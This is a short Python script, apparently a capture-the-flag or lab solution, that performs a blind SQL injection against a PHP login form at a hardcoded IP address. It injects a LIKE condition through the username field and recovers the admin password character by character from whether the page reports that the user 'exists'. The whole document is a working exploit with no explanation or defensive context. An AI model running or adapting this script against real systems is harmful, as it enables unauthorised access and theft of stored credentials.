import requests
import string

s = requests.session()
ip = 'http://52.183.128.218/index.php?debug=True'

col_name = 'password'
pwd = ''

def check_pwd(p : str):
    query = 'admin\" AND '+col_name+' LIKE \"{}%'.format(p)
    r = s.post(ip,{'username':query})
    # print(r.content)
    i = r.content.find(b'exists')
    if (i == -1):
        return False
    else:
        return True
while True:
    op = False
    for i in (string.ascii_letters+string.digits):
        if (check_pwd(pwd+i)):
            pwd += i
            print(pwd)
            op = True
            break
    if (not op):
        print("we're done")
        print(pwd)
        break